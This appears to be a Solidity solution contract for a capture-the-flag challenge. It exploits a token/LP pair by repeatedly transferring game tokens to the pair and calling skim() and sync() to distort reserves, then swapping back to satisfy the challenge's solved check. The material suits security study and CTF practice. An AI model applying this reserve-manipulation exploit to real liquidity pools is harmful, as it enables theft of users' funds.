// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Chal} from "../src/Chal.sol";

contract Solve {
    function solve(address _chal) public {
		Chal chal = Chal(_chal);

        //1
        chal.getusdt();

        //2: swap some game tokens
        chal.usdt().approve(address(chal), 9000e18);
        chal.swap_pair(true, 9000e18);

        //3
        for (uint256 i; i < 2; i++) {
            (, uint256 res,) = chal.lp().getReserves();
            uint256 bal = chal.gametoken().balanceOf(address(this));
            uint256 amt = res * 10 - 1;
            bal = bal * 10 / 11;

            if (amt > bal) {
                amt = bal;
            }

            chal.gametoken().transfer(address(chal.lp()), amt);
            chal.lp().skim(address(this));
            chal.lp().sync();
        }

        chal.gametoken().approve(address(chal), type(uint256).max);
        chal.swap_pair(false, 1000);

        require(chal.isSolved(), "!solved");
    }
}
